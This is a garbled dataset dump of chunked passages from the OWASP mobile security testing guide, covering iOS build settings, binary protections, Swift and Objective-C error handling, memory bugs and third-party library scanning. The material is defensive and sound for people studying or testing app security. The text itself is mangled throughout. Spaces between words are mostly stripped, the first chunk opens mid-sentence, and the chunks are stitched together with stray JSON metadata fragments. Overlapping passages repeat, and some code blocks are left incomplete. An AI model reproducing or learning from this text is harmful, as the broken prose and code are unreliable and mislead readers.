andobservethetraces. /*TID0x303 */ 298382ms -[AppDelegate application:0x10556b3c0continueUserActivity:0x1c4237780 restorationHandler:0x16f27a898] 298619ms |$S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData 18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA 14OpenURLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display0 10NavigationO0CSgyyctF() ApartfromtheObjective-Cmethod,nowthereisoneSwiftfunctionthatisalsoofyourinterest. ThereisprobablynodocumentationforthatSwiftfunctionbutyoucanjustdemangleitssymbolusingswift-demangle viaxcrun: 496\\nxcruncanbeusedinvokeXcodedevelopertoolsfromthecommand-line,withouthavingtheminthepath. Inthis caseitwilllocateandrunswift-demangle,anXcodetoolthatdemanglesSwiftsymbols. $xcrunswift-demangleS10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData 18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14OpenURLContextOSSSbAA0 12PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF Resultingin: --- masvs_category:MASVS-CODE platform:ios --- #iOSCodeQualityandBuildSettings ##Overview ###AppSigning [Codesigning](0x06a-Platform-Overview.md#code-signing)yourappassuresusersthattheapphasaknownsourceandhasn'tbeenmodifiedsinceitwaslastsigned. ↪ Beforeyourappcanintegrateappservices,beinstalledonanon-jailbrokendevice,orbesubmittedtotheAppStore, itmustbesignedwithacertificate ↪ issuedbyApple.Formoreinformationonhowtorequestcertificatesandcodesignyourapps,reviewthe[AppDistribution ↪ Guide](https://developer.apple.com/library/content/documentation/IDEs/Conceptual/AppDistributionGuide/Introduction/Introduction.html\"AppDistribution ↪ Guide\"). ###Third-PartyLibraries iOSapplicationsoftenmakeuseofthirdpartylibrarieswhichacceleratedevelopmentasthedeveloperhastowritelesscode inordertosolveaproblem. ↪ However,thirdpartylibrariesmaycontainvulnerabilities,incompatiblelicensing,ormaliciouscontent.Additionally,itisdifficultfororganizationsand ↪ developerstomanageapplicationdependencies,includingmonitoringlibraryreleasesandapplyingavailablesecuritypatches. Therearethreewidelyusedpackagemanagementtools[SwiftPackageManager](https://swift.org/package-manager\"SwiftPackageManageronSwift.org\"), ↪ [Carthage](https://github.com/Carthage/Carthage\"CarthageonGitHub\"),and[CocoaPods](https://cocoapods.org\"CocoaPods.org\"): -TheSwiftPackageManagerisopensource,includedwiththeSwiftlanguage,integratedintoXcode(sinceXcode11)and supports[Swift,Objective-C, ↪ Objective-C++,C,andC++](https://developer.apple.com/documentation/xcode/swift-packages\"SwiftPackagesDocumentation\")packages.ItiswritteninSwift, ↪ decentralizedandusesthePackage.swiftfiletodocumentandmanageprojectdependencies. -CarthageisopensourceandcanbeusedforSwiftandObjective-Cpackages.ItiswritteninSwift,decentralized andusestheCartfilefiletodocumentand ↪ manageprojectdependencies. -CocoaPodsisopensourceandcanbeusedforSwiftandObjective-Cpackages.ItiswritteninRuby,utilizes acentralizedpackageregistryforpublicand ↪ privatepackagesandusesthePodfilefiletodocumentandmanageprojectdependencies. Therearetwocategoriesoflibraries: -Librariesthatarenot(orshouldnot)bepackedwithintheactualproductionapplication,suchas`OHHTTPStubs`usedfor testing. -Librariesthatarepackedwithintheactualproductionapplication,suchas`Alamofire`. Theselibrariescanleadtounwantedside-effects: -Alibrarycancontainavulnerability,whichwillmaketheapplicationvulnerable.Agoodexampleis`AFNetworking`version2.5.1, whichcontainedabugthat ↪ disabledcertificatevalidation.Thisvulnerabilitywouldallowattackerstoexecuteman-in-the-middleattacksagainstappsthatareusingthelibraryto ↪ connecttotheirAPIs. -Alibrarycannolongerbemaintainedorhardlybeused,whichiswhynovulnerabilitiesarereportedand/or fixed.Thiscanleadtohavingbadand/or ↪ vulnerablecodeinyourapplicationthroughthelibrary. -Alibrarycanusealicense,suchasLGPL2.1,whichrequirestheapplicationauthortoprovideaccesstothe sourcecodeforthosewhousetheapplicationand ↪ requestinsightinitssources.Infacttheapplicationshouldthenbeallowedtoberedistributedwithmodificationstoits sourcecode.Thiscanendanger ↪ theintellectualproperty(IP)oftheapplication. Pleasenotethatthisissuecanholdonmultiplelevels:WhenyouusewebviewswithJavaScriptrunninginthewebview, theJavaScriptlibrariescanhavethese ↪ issuesaswell.Thesameholdsforplugins/librariesforCordova,React-nativeandXamarinapps. ###MemoryCorruptionBugs iOSapplicationshavevariouswaystoruninto[memorycorruptionbugs](0x04h-Testing-Code-Quality.md#memory-corruption-bugs):firsttherearethenativecode ↪ issueswhichhavebeenmentionedinthegeneralMemoryCorruptionBugssection.Next,therearevariousunsafeoperationswithboth Objective-CandSwiftto ↪ actuallywraparoundnativecodewhichcancreateissues.Last,bothSwiftandObjective-Cimplementationscanresultinmemoryleaks duetoretaining ↪ objectswhicharenolongerinuse. Learnmore: -<https://developer.ibm.com/tutorials/mo-ios-memory/> -<https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/MemoryMgmt/Articles/MemoryMgmt.html> -<https://medium.com/zendesk-engineering/ios-identifying-memory-leaks-using-the-xcode-memory-graph-debugger-e84f097b9d15> ###BinaryProtectionMechanisms Detectingthepresenceof[binaryprotectionmechanisms](0x04h-Testing-Code-Quality.md#binary-protection-mechanisms)heavilydependonthelanguageusedfor ↪ developingtheapplication. AlthoughXcodeenablesallbinarysecurityfeaturesbydefault,itmayberelevanttoverifythisforoldapplicationsor tocheckforcompilerflag ↪ misconfigurations.Thefollowingfeaturesareapplicable: -[**PIE(PositionIndependentExecutable)**](0x04h-Testing-Code-Quality.md#position-independent-code): -PIEappliestoexecutablebinaries(Mach-Otype`MH_EXECUTE`). -Howeverit'snotapplicableforlibraries(Mach-Otype`MH_DYLIB`). 497\\n-[**Memorymanagement**](0x04h-Testing-Code-Quality.md#memory-management): -BothpureObjective-C,SwiftandhybridbinariesshouldhaveARC(AutomaticReferenceCounting)enabled. -ForC/C++libraries,thedeveloperisresponsiblefordoingproper[manualmemorymanagement](0x04h-Testing-Code-Quality.md#manual-memory-management).See ↪ [\"MemoryCorruptionBugs\"](0x04h-Testing-Code-Quality.md#memory-corruption-bugs). -[**StackSmashingProtection**](0x04h-Testing-Code-Quality.md#stack-smashing-protection):ForpureObjective-Cbinaries,thisshouldalwaysbeenabled.Since ↪ Swiftisdesignedtobememorysafe,ifalibraryispurelywritteninSwift,andstackcanariesweren’tenabled, theriskwillbeminimal. Learnmore: -[OSXABIMach-OFileFormatReference](https://github.com/aidansteele/osx-abi-macho-file-format-reference) -[OniOSBinaryProtections](https://sensepost.com/blog/2021/on-ios-binary-protections/) -[SecurityofruntimeprocessiniOSandiPadOS](https://support.apple.com/en-gb/guide/security/sec15bfe098e/web) -[Mach-OProgrammingTopics-Position-Independent ↪ Code](https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/MachOTopics/1-Articles/dynamic_code.html) Teststodetectthepresenceoftheseprotectionmechanismsheavilydependonthelanguageusedfordevelopingtheapplication.For example,existingtechniques ↪ fordetectingthepresenceofstackcanariesdonotworkforpureSwiftapps. ####XcodeProjectSettings #####StackCanaryprotection StepsforenablingstackcanaryprotectioninaniOSapplication: 1.InXcode,selectyourtargetinthe\"Targets\"section,thenclickthe\"BuildSettings\"tabtoviewthetarget's settings. 2.Makesurethatthe\"-fstack-protector-all\"optionisselectedinthe\"OtherCFlags\"section. 3.MakesurethatPositionIndependentExecutables(PIE)supportisenabled. #####PIEprotection StepsforbuildinganiOSapplicationasPIE: 1.InXcode,selectyourtargetinthe\"Targets\"section,thenclickthe\"BuildSettings\"tabtoviewthetarget's settings. 2.SettheiOSDeploymentTargettoiOS4.3orlater. 3.Makesurethat\"GeneratePosition-DependentCode\"(section\"AppleClang-CodeGeneration\")issettoitsdefaultvalue(\"NO\"). 4.Makesurethat\"GeneratePosition-DependentExecutable\"(section\"Linking\")issettoitsdefaultvalue(\"NO\"). #####ARCprotection ARCisautomaticallyenabledforSwiftappsbythe`swiftc`compiler.However,forObjective-Cappsyou'llhaveensurethatit'senabledbyfollowingthesesteps: 1.InXcode,selectyourtargetinthe\"Targets\"section,thenclickthe\"BuildSettings\"tabtoviewthetarget's settings. 2.Makesurethat\"Objective-CAutomaticReferenceCounting\"issettoitsdefaultvalue(\"YES\"). Seethe[TechnicalQ&AQA1788BuildingaPositionIndependentExecutable](https://developer.apple.com/library/mac/qa/qa1788/_index.html\"TechnicalQ&AQA1788 ↪ BuildingaPositionIndependentExecutable\"). ###DebuggableApps Appscanbemade[debuggable](0x06c-Reverse-Engineering-and-Tampering.md#debugging)byaddingthe ↪ [`get-task-allow`](https://developer.apple.com/documentation/security/notarizing_macos_software_before_distribution/resolving_common_notarization_issues ↪ \"Resolvingcommonnotarizationissues\")keytotheappentitlementsfileandsettingitto`true`. Whiledebuggingisausefulfeaturewhendevelopinganapp,ithastobeturnedoffbeforereleasingappstotheAppStoreorwithinanenterpriseprogram.Todo ↪ thatyouneedtodeterminethemodeinwhichyourappistobegeneratedtochecktheflagsin theenvironment: -Selectthebuildsettingsoftheproject -Under'AppleLVM-Preprocessing'and'PreprocessorMacros',makesure'DEBUG'or'DEBUG_MODE'isnotselected(Objective-C) -Makesurethatthe\"Debugexecutable\"optionisnotselected. -Orinthe'SwiftCompiler-CustomFlags'section/'OtherSwiftFlags',makesurethe'-DDEBUG'entry doesnotexist. ###DebuggingSymbols Asagoodpractice,aslittleexplanatoryinformationaspossibleshouldbeprovidedwithacompiledbinary.Thepresenceof additionalmetadatasuchasdebug ↪ symbolsmightprovidevaluableinformationaboutthecode,e.g.functionnamesleakinginformationaboutwhatafunctiondoes.Thismetadata isnotrequired ↪ toexecutethebinaryandthusitissafetodiscarditforthereleasebuild,whichcanbedone byusingpropercompilerconfigurations.Asatesteryou ↪ shouldinspectallbinariesdeliveredwiththeappandensurethatnodebuggingsymbolsarepresent(atleastthoserevealing anyvaluableinformationabout ↪ thecode). WhenaniOSapplicationiscompiled,thecompilergeneratesalistofdebugsymbolsforeachbinaryfileinan app(themainappexecutable,frameworks,andapp ↪ extensions).Thesesymbolsincludeclassnames,globalvariables,andmethodandfunctionnameswhicharemappedtospecificfilesand linenumberswhere ↪ they'redefined.[Debugbuilds](https://developer.apple.com/documentation/xcode/building-your-app-to-include-debugging-information\"BuildingYourAppto ↪ IncludeDebuggingInformation\")ofanappplacethedebugsymbolsinacompiledbinarybydefault,whilereleasebuildsof anappplacetheminacompanion ↪ _DebugSymbolfile_(dSYM)toreducethesizeofthedistributedapp. ###DebuggingCodeandErrorLogging Tospeedupverificationandgetabetterunderstandingoferrors,developersoftenincludedebuggingcode,suchasverboselogging statements(using`NSLog`, ↪ `println`,`print`,`dump`,and`debugPrint`)aboutresponsesfromtheirAPIsandabouttheirapplication'sprogressand/orstate.Furthermore,theremay be ↪ debuggingcodefor\"management-functionality\",whichisusedbydeveloperstosettheapplication'sstateormockresponsesfromanAPI. Reverseengineers ↪ caneasilyusethisinformationtotrackwhat'shappeningwiththeapplication.Therefore,debuggingcodeshouldberemovedfromthe application'srelease ↪ version. ###ExceptionHandling Exceptionsoftenoccurafteranapplicationentersanabnormalorerroneousstate. Testingexceptionhandlingisaboutmakingsurethattheapplicationwillhandletheexceptionandgetintoasafestate withoutexposinganysensitive ↪ informationviaitsloggingmechanismsortheUI. BearinmindthatexceptionhandlinginObjective-CisquitedifferentfromexceptionhandlinginSwift.Bridgingthetwoapproaches inanapplicationthatis ↪ writteninbothlegacyObjective-CcodeandSwiftcodecanbeproblematic. 498\\n####ExceptionHandlinginObjective-C Objective-Chastwotypesoferrors: **NSException:** `NSException`isusedtohandleprogrammingandlow-levelerrors(e.g.,divisionby0andout-of-boundsarrayaccess). An`NSException`caneitherberaisedby`raise`orthrownwith`@throw`.Unlesscaught,thisexceptionwillinvoketheunhandled exceptionhandler,withwhich ↪ youcanlogthestatement(loggingwillhalttheprogram).`@catch`allowsyoutorecoverfromtheexceptionifyou're usinga`@try`-`@catch`-block: ```objectivec @try{ //doworkhere } @catch(NSException*e){ //recoverfromexception } @finally{ //cleanup BearinmindthatusingNSExceptioncomeswithmemorymanagementpitfalls: youneedtocleanupallocationsfrom thetryblockthatareinthefinallyblock. NotethatyoucanpromoteNSExceptionobjectstoNSErrorbyinstantiatingan NSErrorinthe@catchblock. NSError: NSErrorisusedforallothertypesoferrors. SomeCocoaframeworkAPIsprovideerrorsasobjectsintheirfailurecallback incasesomethinggoeswrong; thosethatdon’tprovidethempassapointertoanNSErrorobjectbyreference. Itisa goodpracticetoprovideaBOOLreturntypetothemethodthattakesapointertoanNSErrorobjecttoindicatesuccess orfailure. Ifthere’sareturntype,makesuretoreturnnilforerrors. IfNOornilisreturned,itallowsyoutoinspectthe error/reasonforfailure. Exception Handling in Swift ExceptionhandinginSwift(2-5)isquitedifferent. Thetry-catchblockisnottheretohandleNSException. Theblockis usedtohandleerrorsthatconformtotheError(Swift3)orErrorType(Swift2)protocol. Thiscanbechallengingwhen Objective-CandSwiftcodearecombinedinanapplication. Therefore,NSErrorispreferabletoNSExceptionforprograms writteninbothlanguages. Furthermore,error-handlingisopt-ininObjective-C,butthrowsmustbeexplicitlyhandledin Swift. Toconverterror-throwing,lookattheAppledocumentation. Methodsthatcanthrowerrorsusethethrowskeyword. TheResulttyperepresentsasuccessorfailure,seeResult,HowtouseResultinSwift5andThepowerofResulttypes inSwift. TherearefourwaystohandleerrorsinSwift: • Propagate the error from a function to the code that calls that function. In this situation, there’s no do-catch; there’sonlyathrowthrowingtheactualerrororatrytoexecutethemethodthatthrows. Themethodcontaining thetryalsorequiresthethrowskeyword: funcdosomething(argumentx:TypeX)throws{ tryfunctionThatThrows(argumentx:argumentx) } • Handletheerrorwithado-catchstatement. Youcanusethefollowingpattern: funcdoTryExample() { do{ tryfunctionThatThrows(number: 203) }catch NumberError.lessThanZero{ //Handle numberislessthanzero }catch letNumberError.tooLarge(delta){ //Handle numberistoolarge(withdeltavalue) }catch { //Handle anyothererrors } } enumNumberError: Error{ caselessThanZero casetooLarge(Int) casetooSmall(Int) } funcfunctionThatThrows(number: Int)throws->Bool{ ifnumber <0{ throwNumberError.lessThanZero 499\\n}else ifnumber<10{ throwNumberError.tooSmall(10 -number) }else ifnumber>100{ throwNumberError.tooLarge(100 -number) }else { returntrue } } • Handletheerrorasanoptionalvalue: letx =try?functionThatThrows() //In thiscasethevalueofxisnilincaseofanerror. • Usethetry! expressiontoassertthattheerrorwon’toccur. • HandlethegenericerrorasaResultreturn: enumErrorType:Error{ casetypeOne casetypeTwo } funcfunctionWithResult(param:String?)->Result<String,ErrorType>{ guardletvalue=paramelse{ return.failure(.typeOne) } return.success(value) } funccallResultFunction(){ letresult=functionWithResult(param:\"OWASP\") switchresult{ caselet.success(value): //Handlesuccess caselet.failure(error): //Handlefailure(witherror) } } • HandlenetworkandJSONdecodingerrorswithaResulttype: structMSTG:Codable{ varroot:String varplugins:[String] varstructure:MSTGStructure vartitle:String varlanguage:String vardescription:String } structMSTGStructure:Codable{ varreadme:String } enumRequestError:Error{ caserequestError(Error) casenoData casejsonError } funcgetMSTGInfo(){ guardleturl=URL(string:\"https://raw.githubusercontent.com/OWASP/owasp-mastg/master/book.json\")else{ return } request(url:url){resultin switchresult{ caselet.success(data): //HandlesuccesswithMSTGdata letmstgTitle=data.title letmstgDescription=data.description caselet.failure(error): //Handlefailure switcherror{ caselet.requestError(error): //Handlerequesterror(witherror) case.noData: //Handlenodatareceivedinresponse case.jsonError: //HandleerrorparsingJSON } } } } 500\\nfuncrequest(url:URL,completion:@escaping(Result<MSTG,RequestError>)->Void){ lettask=URLSession.shared.dataTask(with:url){data,_,errorin ifleterror=error{ returncompletion(.failure(.requestError(error))) }else{ ifletdata=data{ letdecoder=JSONDecoder() guardletresponse=try?decoder.decode(MSTG.self,from:data)else{ returncompletion(.failure(.jsonError)) } returncompletion(.success(response)) } } } task.resume() } Testing Object Persistence Platform: ios MASVSV1: MSTG-PLATFORM-8 MASVSV2: MASVS-CODE-4 Overview Static Analysis Alldifferentflavorsofobjectpersistencesharethefollowingconcerns: • Ifyouuseobjectpersistencetostoresensitiveinformationonthedevice,thenmakesurethatthedataisencrypted: eitheratthedatabaselevel,orspecificallyatthevaluelevel. • Needtoguaranteetheintegrityoftheinformation? UseanHMACmechanismorsigntheinformationstored. Always verifytheHMAC/signaturebeforeprocessingtheactualinformationstoredintheobjects. • MakesurethatkeysusedinthetwonotionsabovearesafelystoredintheKeyChainandwellprotected. Seethe chapter“DataStorageoniOS”formoredetails. • Ensurethatthedatawithinthedeserializedobjectiscarefullyvalidatedbeforeitisactivelyused(e.g.,noexploit ofbusiness/applicationlogicispossible). • DonotusepersistencemechanismsthatuseRuntimeReferencetoserialize/deserializeobjectsinhigh-riskappli- cations,astheattackermightbeabletomanipulatethestepstoexecutebusinesslogicviathismechanism(see thechapter“iOSAnti-ReversingDefenses”formoredetails). • NotethatinSwift2andbeyond,aMirrorcanbeusedtoreadpartsofanobject,butcannotbeusedtowriteagainst theobject. Dynamic Analysis Thereareseveralwaystoperformdynamicanalysis: • Fortheactualpersistence: Usethetechniquesdescribedinthe“DataStorageoniOS”chapter. •",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 161
    }
  },
  {
    "text": "returncompletion(.failure(.jsonError)) } returncompletion(.success(response)) } } } task.resume() } Testing Object Persistence Platform: ios MASVSV1: MSTG-PLATFORM-8 MASVSV2: MASVS-CODE-4 Overview Static Analysis Alldifferentflavorsofobjectpersistencesharethefollowingconcerns: • Ifyouuseobjectpersistencetostoresensitiveinformationonthedevice,thenmakesurethatthedataisencrypted: eitheratthedatabaselevel,orspecificallyatthevaluelevel. • Needtoguaranteetheintegrityoftheinformation? UseanHMACmechanismorsigntheinformationstored. Always verifytheHMAC/signaturebeforeprocessingtheactualinformationstoredintheobjects. • MakesurethatkeysusedinthetwonotionsabovearesafelystoredintheKeyChainandwellprotected. Seethe chapter“DataStorageoniOS”formoredetails. • Ensurethatthedatawithinthedeserializedobjectiscarefullyvalidatedbeforeitisactivelyused(e.g.,noexploit ofbusiness/applicationlogicispossible). • DonotusepersistencemechanismsthatuseRuntimeReferencetoserialize/deserializeobjectsinhigh-riskappli- cations,astheattackermightbeabletomanipulatethestepstoexecutebusinesslogicviathismechanism(see thechapter“iOSAnti-ReversingDefenses”formoredetails). • NotethatinSwift2andbeyond,aMirrorcanbeusedtoreadpartsofanobject,butcannotbeusedtowriteagainst theobject. Dynamic Analysis Thereareseveralwaystoperformdynamicanalysis: • Fortheactualpersistence: Usethetechniquesdescribedinthe“DataStorageoniOS”chapter. • For the serialization itself: Use a debug build or use Frida / objection to see how the serialization methods are handled(e.g.,whethertheapplicationcrashesorextrainformationcanbeextractedbyenrichingtheobjects). Memory Corruption Bugs Platform: ios MASVSV1: MSTG-CODE-8 MASVSV2: MASVS-CODE-4 501\\nOverview Static Analysis Aretherenativecodeparts? Ifso: checkforthegivenissuesinthegeneralmemorycorruptionsection. Nativecodeisa littlehardertospotwhencompiled. IfyouhavethesourcesthenyoucanseethatCfilesuse.csourcefilesand.hheader files and C++ uses .cpp files and .h files. This is a little different from the .swift and the .m source files for Swift and Objective-C.Thesefilescanbepartofthesources,orpartofthirdpartylibraries,registeredasframeworksandimported throughvarioustools,suchasCarthage,theSwiftPackageManagerorCocoapods. Foranymanagedcode(Objective-C/Swift)intheproject,checkthefollowingitems: • ThedoubleFreeissue: whenfreeiscalledtwiceforagivenregioninsteadofonce. • Retainingcycles: lookforcyclicdependenciesbymeansofstrongreferencesofcomponentstooneanotherwhich keepmaterialsinmemory. • UsinginstancesofUnsafePointercanbemanagedwrongly,whichwillallowforvariousmemorycorruptionissues. • TryingtomanagethereferencecounttoanobjectbyUnmanagedmanually,leadingtowrongcounternumbersand atoolate/toosoonrelease. AgreattalkisgivenonthissubjectatRealmacademyandanicetutorialtoseewhatisactuallyhappeningisprovided byRayWenderlichonthissubject. PleasenotethatwithSwift5youcanonlydeallocatefullblocks,whichmeanstheplaygroundhaschangedabit. Dynamic Analysis There are various tools provided which help to identify memory bugs within Xcode, such as the Debug Memory graph introducedinXcode8andtheAllocationsandLeaksinstrumentinXcode. Next,youcancheckwhethermemoryisfreedtoofastortooslowbyenablingNSAutoreleaseFreedObjectCheckEnabled, NSZombieEnabled,NSDebugEnabledinXcodewhiletestingtheapplication. Therearevariouswellwrittenexplanationswhichcanhelpwithtakingcareofmemorymanagement. Thesecanbefound inthereferencelistofthischapter. Testing Enforced Updating Platform: ios MASVSV1: MSTG-ARCH-9 MASVSV2: MASVS-CODE-2 Overview Static Analysis Firstseewhetherthereisanupdatemechanismatall: ifitisnotyetpresent,itmightmeanthatuserscannotbeforced toupdate. Ifthemechanismispresent,seewhetheritenforces“alwayslatest”andwhetherthatisindeedinlinewith thebusinessstrategy. Otherwisecheckifthemechanismissupportingtoupdatetoagivenversion. Makesurethatevery entryoftheapplicationgoesthroughtheupdatingmechanisminordertomakesurethattheupdate-mechanismcannot bebypassed. Dynamic analysis Inordertotestforproperupdating: trydownloadinganolderversionoftheapplicationwithasecurityvulnerability,either byareleasefromthedevelopersorbyusingathirdpartyapp-store. Next,verifywhetherornotyoucancontinuetouse 502\\ntheapplicationwithoutupdatingit. Ifanupdatepromptisgiven,verifyifyoucanstillusetheapplicationbycancelingthe prompt or otherwise circumventing it through normal application usage. This includes validating whether the backend willstopcallstovulnerablebackendsand/orwhetherthevulnerableapp-versionitselfisblockedbythebackend. Finally, seeifyoucanplaywiththeversionnumberofaman-in-the-middledappandseehowthebackendrespondstothis(and ifitisrecordedatallforinstance). Checking for Weaknesses in Third Party Libraries Platform: ios MASVSV1: MSTG-CODE-5 MASVSV2: MASVS-CODE-3 Overview Static Analysis Detecting vulnerabilities of third party libraries Inordertoensurethatthelibrariesusedbytheappsarenotcarryingvulnerabilities,onecanbestcheckthedependencies installedbyCocoaPodsorCarthage. Swift Package Manager IncaseSwiftPackageManagerisusedformanagingthirdpartydependencies,thefollowingstepscanbetakentoanalyze thethirdpartylibrariesforvulnerabilities: First,attherootoftheproject,wherethePackage.swiftfileislocated,type swiftbuild Next, checkthefilePackage.resolvedfortheactualversionsusedandinspectthegivenlibrariesforknownvulnerabili- ties. YoucanutilizetheOWASPDependency-Check’sexperimentalSwiftPackageManagerAnalyzertoidentifytheCommon PlatformEnumeration(CPE)namingschemeofalldependenciesandanycorrespondingCommonVulnerabilityandExpo- sure(CVE)entries. Scantheapplication’sPackage.swiftfileandgenerateareportofknownvulnerablelibrarieswiththe followingcommand: dependency-check --enableExperimental --out .--scan Package.swift CocoaPods IncaseCocoaPodsisusedformanagingthirdpartydependencies,thefollowingstepscanbetakentoanalyzethethird partylibrariesforvulnerabilities. First,attherootoftheproject,wherethePodfileislocated,executethefollowingcommands: sudo geminstallcocoapods podinstall Next,nowthatthedependencytreehasbeenbuilt,youcancreateanoverviewofthedependenciesandtheirversions byrunningthefollowingcommands: sudo geminstallcocoapods-dependencies poddependencies Theresultofthestepsabovecannowbeusedasinputforsearchingdifferentvulnerabilityfeedsforknownvulnerabili- ties. 503\\nNote: 1. If the developer packs all dependencies in terms of its own support library using a .podspec file, then this .podspecfilecanbecheckedwiththeexperimentalCocoaPodspodspecchecker. 2. IftheprojectusesCocoaPodsincombinationwithObjective-C,SourceClearcanbeused. 3. Using CocoaPods with HTTP-based links instead of HTTPS might allow for man-in-the-middle attacks during the download of the dependency, allowing an attacker to replace (parts of) the library with other content. Therefore,alwaysuseHTTPS. YoucanutilizetheOWASPDependency-Check’sexperimentalCocoaPodsAnalyzertoidentifytheCommonPlatformEnu- meration (CPE) naming scheme of all dependencies and any corresponding Common Vulnerability and Exposure (CVE) entries. Scantheapplication’s*.podspecand/orPodfile.lockfilesandgenerateareportofknownvulnerablelibrarieswith thefollowingcommand: dependency-check --enableExperimental --out .--scan Podfile.lock Carthage IncaseCarthageisusedforthirdpartydependencies, thenthefollowingstepscanbetakentoanalyzethethirdparty librariesforvulnerabilities. First,attherootoftheproject,wheretheCartfileislocated,type brewinstallcarthage carthageupdate --platform iOS Next,checktheCartfile.resolvedforactualversionsusedandinspectthegivenlibrariesforknownvulnerabilities. Note, atthetimeofwritingthischapter, thereisnoautomatedsupportforCarthagebaseddependencyanalysis knowntotheauthors. Atleast,thisfeaturewasalreadyrequestedfortheOWASPDependencyChecktoolbutnot yetimplemented(seetheGitHubissue). Discovered library vulnerabilities Whenalibraryisfoundtocontainvulnerabilities,thenthefollowingreasoningapplies: • Isthelibrarypackagedwiththeapplication? Thencheckwhetherthelibraryhasaversioninwhichthevulnerability ispatched. Ifnot,checkwhetherthevulnerabilityactuallyaffectstheapplication. Ifthatisthecaseormightbethe caseinthefuture,thenlookforanalternativewhichprovidessimilarfunctionality,butwithoutthevulnerabilities. • Isthelibrarynotpackagedwiththeapplication? Seeifthereisapatchedversioninwhichthevulnerabilityisfixed. If thisisnotthecase,checkiftheimplicationsofthevulnerabilityforthebuildprocess. Couldthevulnerabilityimpede abuildorweakenthesecurityofthebuild-pipeline? Thentrylookingforanalternativeinwhichthevulnerabilityis fixed. Incaseframeworksareaddedmanuallyaslinkedlibraries: 1. Openthexcodeprojfileandchecktheprojectproperties. 2. Go to the tab Build Phases and check the entries in Link Binary With Libraries for any of the libraries. See earliersectionsonhowtoobtainsimilarinformationusingMobSF. Inthecaseofcopy-pastedsources: searchtheheaderfiles(incaseofusingObjective-C)andotherwisetheSwiftfilesfor knownmethodnamesforknownlibraries. Next, note that for hybrid applications, you will have to check the JavaScript dependencies with RetireJS. Similarly for Xamarin,youwillhavetochecktheC#dependencies. Last,iftheapplicationisahigh-riskapplication,youwillendupvettingthelibrarymanually. Inthatcasetherearespecific requirements for native code, which are similar to the requirements established by the MASVS for the application as a whole. Nexttothat,itisgoodtovetwhetherallbestpracticesforsoftwareengineeringareapplied. 504\\nDynamic Analysis Thedynamicanalysisofthissectioncomprisesoftwoparts: theactuallicenseverificationandcheckingwhichlibraries areinvolvedincaseofmissingsources. Itneedtobevalidatedwhetherthecopyrightsofthelicenseshavebeenadheredto. Thisoftenmeansthattheapplication shouldhaveanaboutorEULAsectioninwhichthecopy-rightstatementsarenotedasrequiredbythelicenseofthethird partylibrary. Listing Application Libraries When performing app analysis, it is important to also analyze the app dependencies (usually in form of libraries or so- called iOS Frameworks) and ensure that they don’t contain any vulnerabilities. Even when you don’t",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 162
    }
  },
  {
    "text": "a whole. Nexttothat,itisgoodtovetwhetherallbestpracticesforsoftwareengineeringareapplied. 504\\nDynamic Analysis Thedynamicanalysisofthissectioncomprisesoftwoparts: theactuallicenseverificationandcheckingwhichlibraries areinvolvedincaseofmissingsources. Itneedtobevalidatedwhetherthecopyrightsofthelicenseshavebeenadheredto. Thisoftenmeansthattheapplication shouldhaveanaboutorEULAsectioninwhichthecopy-rightstatementsarenotedasrequiredbythelicenseofthethird partylibrary. Listing Application Libraries When performing app analysis, it is important to also analyze the app dependencies (usually in form of libraries or so- called iOS Frameworks) and ensure that they don’t contain any vulnerabilities. Even when you don’t have the source code, you can still identify some of the app dependencies using tools likeobjection, MobSF or the otool -L command. Objectionistherecommendedtool,sinceitprovidesthemostaccurateresultsanditiseasytouse. Itcontainsamodule toworkwithiOSBundles,whichofferstwocommands: list_bundlesandlist_frameworks. Thelist_bundlescommandlistsalloftheapplication’sbundlesthatarenotrelatedtoFrameworks. Theoutputcontains executablename,bundleid,versionofthelibraryandpathtothelibrary. ...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #iosbundleslist_bundles Executable Bundle Version Path ##MakeSureThatFreeSecurityFeaturesAreActivated >**Platform:**ios > >**MASVSV1:**MSTG-CODE-9 > >**MASVSV2:**MASVS-CODE-4 ###Overview ###StaticAnalysis Youcanuseradare2tocheckthebinarysecurityfeatures. Let'susethe[DamnVulnerableiOSAppDVIAv1](https://github.com/prateek147/DVIA/)asanexample.Openitsmainbinarywithradare2: ```bash r2DamnVulnerableIOSApp Andrunthefollowingcommands: [0x1000180c8]>i~pic,canary canary true pic true [0x1000180c8]>is~release,retain 124 0x002951e00x1000891e0LOCAL FUNC0 imp.dispatch_release 149 0x00294e800x100088e80LOCAL FUNC0 imp.objc_autorelease 150 0x00294e8c0x100088e8cLOCAL FUNC0 imp.objc_autoreleasePoolPop 151 0x00294e980x100088e98LOCAL FUNC0 imp.objc_autoreleasePoolPush 152 0x00294ea40x100088ea4LOCAL FUNC0 imp.objc_autoreleaseReturnValue 165 0x00294f400x100088f40LOCAL FUNC0 imp.objc_release 167 0x00294f580x100088f58LOCAL FUNC0 imp.objc_retainAutorelease 168 0x00294f640x100088f64LOCAL FUNC0 imp.objc_retainAutoreleaseReturnValue 169 0x00294f700x100088f70LOCAL FUNC0 imp.objc_retainAutoreleasedReturnValue Allthefeaturesareenabledintheseexamples: • PIE(PositionIndependentExecutable): indicatedbytheflagpic true. – Appliestoallappsindependentlyofthelanguageused. – Appliesonlytothemainexecutable(MH_EXECUTE),nottodynamiclibraries(MH_DYLIB). • StackCanary: indicatedbytheflagcanary true. – AppliestoappscontainingObjective-Ccode. – NotnecessarilyrequiredforpureSwiftapps(Swiftismemorysafebydesign). – EspeciallyimportantforappscontainingC/C++code,astheyprovidedirectaccesstomemoryandpointers, makingthemmorevulnerabletobufferoverflows. 505\\n• ARC (Automatic Reference Counting): indicated by symbols such as objc_autorelease or objc_retainAutore- lease. – ImportantforbinariescontainingObjective-Ccode. – ForbinarieswrittenpurelyinSwift,ARCisenabledbydefault. – ARC is not relevant for binaries written purely in C/C++, as it’s a memory management feature specific to Objective-CandSwift. Dynamic Analysis Thesecheckscanbeperformeddynamicallyusingobjection. Here’soneexample: com.yourcompany.PPClienton (iPhone:13.2.3)[usb] 